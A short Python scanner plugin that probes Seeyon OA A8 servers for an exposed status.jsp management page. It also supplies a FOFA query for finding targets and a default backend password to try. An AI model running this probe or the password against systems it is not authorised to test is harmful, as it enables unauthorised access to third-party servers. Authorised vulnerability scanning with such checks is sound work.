#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/致远OA/致远OA A8 status.jsp 信息泄露漏洞.html',

      'huixian'   :  '检测到疑似漏洞页面，请尝试后台密码： WLCCYBD@SEEYON',

      'method'    :   'get',

      'bugname'   :   '致远OA A8 status.jsp 信息泄露',

      'level'     :   'high',

      'FOFA'      :   'title="A8-m"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/seeyon/management/status.jsp'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "A8 Management Monitor" in res.text and 'password' in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret